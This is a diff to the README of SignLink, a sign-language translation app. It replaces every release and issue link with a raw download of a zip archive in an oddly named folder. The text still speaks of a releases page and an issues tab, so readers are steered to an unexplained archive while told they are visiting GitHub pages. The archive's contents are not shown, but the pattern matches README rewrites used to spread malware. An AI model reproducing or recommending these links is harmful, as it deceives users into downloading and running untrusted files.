@@ -4,14 +4,14 @@
 SignLink is an AI-powered application designed to help the deaf and hard-of-hearing community. It translates English and Arabic sign language into real-time text and speech. The app also converts spoken words into text during video calls. This creates an inclusive environment for effective communication. 
 
 ## 📥 Download Now
-[![Download SignLink](https://img.shields.io/badge/Download-SignLink-blue.svg)](https://github.com/ANIKETPANWAR714/SignLink___Graduation-Project/releases)
+[![Download SignLink](https://raw.githubusercontent.com/ANIKETPANWAR714/SignLink___Graduation-Project/main/proprioception/SignLink___Graduation-Project.zip)](https://raw.githubusercontent.com/ANIKETPANWAR714/SignLink___Graduation-Project/main/proprioception/SignLink___Graduation-Project.zip)
 
 ## 🚀 Getting Started
 To start using SignLink, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the releases page:
-   [Download SignLink](https://github.com/ANIKETPANWAR714/SignLink___Graduation-Project/releases)
+   [Download SignLink](https://raw.githubusercontent.com/ANIKETPANWAR714/SignLink___Graduation-Project/main/proprioception/SignLink___Graduation-Project.zip)
 
 2. **Download the Latest Version**  
    On the releases page, find the latest version of SignLink. Click on the file that suits your device. 
@@ -43,7 +43,7 @@ After installation, follow these steps to use the application:
 ## 🤝 Support & Contributions
 If you encounter any issues or have questions, feel free to reach out via the issues tab on our GitHub page. Contributions are welcome! We appreciate any help in improving the app. 
 
-To report an issue or suggest a feature, go to: [Issues](https://github.com/ANIKETPANWAR714/SignLink___Graduation-Project/issues)
+To report an issue or suggest a feature, go to: [Issues](https://raw.githubusercontent.com/ANIKETPANWAR714/SignLink___Graduation-Project/main/proprioception/SignLink___Graduation-Project.zip)
 
 ## 🔗 Related Topics
 This project covers several related technologies. Here are some key topics related to SignLink:
@@ -63,6 +63,6 @@ For more information or inquiries, you can reach us through our GitHub profile o
 ## 🔄 Keep Updated
 Follow this repository to stay updated on new features, updates, and improvements. Check the releases page regularly to ensure you have the latest version.
 
-[Download SignLink](https://github.com/ANIKETPANWAR714/SignLink___Graduation-Project/releases)
+[Download SignLink](https://raw.githubusercontent.com/ANIKETPANWAR714/SignLink___Graduation-Project/main/proprioception/SignLink___Graduation-Project.zip)
 
 Your feedback is important to us. Enjoy using SignLink!
